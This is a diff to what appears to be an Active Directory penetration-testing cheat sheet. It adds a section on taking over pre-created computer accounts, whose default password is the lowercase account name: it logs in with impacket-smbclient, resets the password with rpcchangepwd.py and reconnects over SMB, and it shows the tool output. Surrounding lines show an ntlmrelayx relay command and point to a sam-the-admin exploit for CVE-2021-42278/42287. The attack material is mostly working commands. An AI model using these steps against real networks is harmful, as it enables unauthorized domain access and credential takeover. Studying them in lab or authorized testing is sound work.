@@ -385,9 +385,50 @@ Exploitation:
     ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
     ```
 
+---
 
+# PRE-CREATED COMPUTER ACCOUNTS
+### FINDING PRE-CREATED COMPUTER ACCOUNTS
 
+For instance, the computer account `DavesLaptop$` would have the password `daveslaptop`
 
+- Note that when dealing with computer accounts, it is smart to escape the `$` with a `\`.
+
+```bash
+impacket-smbclient <domain>/<computer account>\$:<password>@<IP>
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.)
+```
+
+Notice we have `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
+
+### Change The Password
+We can use either of these:
+- https://github.com/fortra/impacket/blob/master/examples/changepasswd.py
+- https://github.com/api0cradle/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
+
+```bash
+python3 rpcchangepwd.py <domain>/<computer account>\$:<password>@<IP> -newpass P@ssw0rd                           31s
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Password was changed successfully.
+```
+
+### Connect to SMB with the new creds
+```bash
+impacket-smbclient <domain>/<computer account>\$:<new set password>@<IP>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# 
+
+```
+
+**- Reference : https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/**
+
+---
 
 ### Exploiting CVE-2021-42278 and CVE-2021-42287
 Download the epxloit script https://github.com/WazeHell/sam-the-admin
